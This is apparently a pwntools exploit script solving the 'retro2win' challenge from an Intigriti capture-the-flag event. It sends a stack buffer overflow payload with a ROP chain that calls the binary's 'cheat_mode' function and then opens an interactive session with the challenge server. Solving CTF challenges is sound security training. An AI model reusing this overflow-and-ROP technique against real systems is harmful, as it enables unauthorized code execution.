import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './retro2win'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='retro2win.ctf.intigriti.io 1338')
# r = Pwn(PROG)
r.sla(b'Select an option:', b'1337')

pay = b'A' * (16+8)
pay += p64(0x00000000004009b3) + p64(0x2323232323232323)
pay += p64(0x00000000004009b1) + p64(0x4242424242424242) + p64(0x4242424242424242)
pay += p64(r.sym['cheat_mode'])
r.sla(b'Enter your cheatcode:', pay)

r.interactive()